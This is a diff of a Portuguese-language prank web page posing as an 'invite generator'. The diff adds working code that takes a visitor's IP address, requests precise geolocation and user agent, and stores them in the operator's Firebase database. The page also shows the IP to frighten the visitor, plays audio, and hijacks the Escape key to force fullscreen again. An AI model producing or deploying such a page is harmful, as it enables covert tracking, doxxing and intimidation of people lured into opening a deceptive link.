@@ -92,7 +92,10 @@ button {
   position: absolute;
   bottom: 20px;
   font-size: 14px;
-  opacity: 0.7;
+  opacity: 0.8;
+  text-align: center;
+  padding: 0 16px;
+  max-width: 90vw;
 }
 
 @keyframes shake {
@@ -113,7 +116,7 @@ button {
 <body>
 
 <div id="startScreen">
-  <h1>skit ~invite generator </h1>
+  <h1>skit ~invite generator</h1>
   <p>real mesmo clique ali</p>
   <button id="openBtn">aqui</button>
 </div>
@@ -121,18 +124,35 @@ button {
 <div id="effectScreen">
   <div class="overlay"></div>
   <div class="glitch" id="text">PREPARING...</div>
-  <div class="exitHint">diga q é este o seu ip e elses dao</div>
+  <div class="exitHint" id="locationText">A pedir IP e localização...</div>
 
   <audio id="audio1" preload="auto" src="1.mp3"></audio>
   <audio id="audio2" preload="auto" src="2.mp3"></audio>
   <audio id="audio3" preload="auto" src="3.mp3"></audio>
 </div>
 
-<script>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+/* Mete aqui a TUA config do Firebase */
+const firebaseConfig = {
+  apiKey: "METE_AQUI",
+  authDomain: "METE_AQUI",
+  projectId: "METE_AQUI",
+  storageBucket: "METE_AQUI",
+  messagingSenderId: "METE_AQUI",
+  appId: "METE_AQUI"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
 const openBtn = document.getElementById("openBtn");
 const startScreen = document.getElementById("startScreen");
 const effectScreen = document.getElementById("effectScreen");
 const text = document.getElementById("text");
+const locationText = document.getElementById("locationText");
 
 const audio1 = document.getElementById("audio1");
 const audio2 = document.getElementById("audio2");
@@ -142,11 +162,11 @@ let invertInterval = null;
 let cachedIP = "UNKNOWN";
 let effectStarted = false;
 
-/* buscar IP logo ao carregar */
+/* Buscar IP logo ao carregar */
 fetch("https://api.ipify.org?format=json")
   .then(res => res.json())
   .then(data => {
-    cachedIP = data.ip;
+    cachedIP = data.ip || "UNKNOWN";
     if (effectStarted) text.textContent = cachedIP;
   })
   .catch(() => {
@@ -184,6 +204,66 @@ function stopAllAudio() {
   });
 }
 
+async function saveToFirestore(payload) {
+  try {
+    await addDoc(collection(db, "logs"), {
+      ...payload,
+      createdAt: serverTimestamp()
+    });
+    console.log("Guardado no Firestore:", payload);
+    locationText.textContent =
+      `Guardado: LAT ${payload.latitude.toFixed(5)} | LON ${payload.longitude.toFixed(5)} | IP ${payload.ip}`;
+  } catch (error) {
+    console.error("Erro ao guardar no Firestore:", error);
+    locationText.textContent = "Erro ao guardar no Firebase.";
+  }
+}
+
+function requestLocationAndSave() {
+  if (!navigator.geolocation) {
+    locationText.textContent = "Geolocalização não suportada neste browser.";
+    return;
+  }
+
+  locationText.textContent = "A pedir permissão de localização...";
+
+  navigator.geolocation.getCurrentPosition(
+    async (position) => {
+      const payload = {
+        ip: cachedIP,
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        userAgent: navigator.userAgent
+      };
+
+      await saveToFirestore(payload);
+    },
+    (error) => {
+      console.error("Erro ao obter localização:", error);
+
+      switch (error.code) {
+        case error.PERMISSION_DENIED:
+          locationText.textContent = "Permissão de localização negada.";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          locationText.textContent = "Localização indisponível.";
+          break;
+        case error.TIMEOUT:
+          locationText.textContent = "Tempo de espera excedido.";
+          break;
+        default:
+          locationText.textContent = "Erro ao obter localização.";
+      }
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
+    }
+  );
+}
+
 async function startEffect() {
   if (effectStarted) return;
   effectStarted = true;
@@ -205,25 +285,23 @@ async function startEffect() {
   audio1.play().catch(() => {});
   setTimeout(() => audio2.play().catch(() => {}), 100);
   setTimeout(() => audio3.play().catch(() => {}), 200);
+
+  requestLocationAndSave();
 }
 
 openBtn.addEventListener("click", startEffect);
 
 document.addEventListener("keydown", async (e) => {
   if (e.key === "Escape") {
-
-    /* parar tudo */
     stopInvertEffect();
     stopAllAudio();
 
     effectStarted = false;
 
-    /* 💥 forçar fullscreen outra vez */
     try {
       await enterFullscreen();
     } catch (err) {}
 
-    /* reiniciar efeito */
     setTimeout(() => {
       startEffect();
     }, 50);
